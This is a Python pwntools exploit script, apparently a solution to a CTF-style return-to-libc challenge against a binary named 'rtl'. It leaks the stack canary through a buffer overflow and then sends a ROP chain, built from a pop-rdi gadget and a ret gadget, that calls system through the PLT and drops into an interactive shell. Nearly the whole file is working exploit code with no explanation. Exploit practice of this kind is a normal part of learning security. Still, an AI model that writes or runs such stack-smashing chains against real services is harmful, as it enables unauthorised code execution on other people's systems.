#!/usr/bin/env python3

from pwn import *

exe = ELF('rtl', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+209
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak canary
sa(b'Buf: ', b'A'*57)
p.recvuntil(b'A'*57, drop=True)
canary_leak = u64((p.recv(7).ljust(8, b'\0')))
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Overwrite
pop_rdi = 0x0000000000400853
ret = 0x0000000000400596
payload = flat(
    b'A'*56,
    p64(canary_leak << 8),
    p64(0),
    p64(pop_rdi),
    p64(0x400874),
    p64(ret),
    p64(exe.plt['system']),
    )
sa(b'Buf: ', payload)

p.interactive()
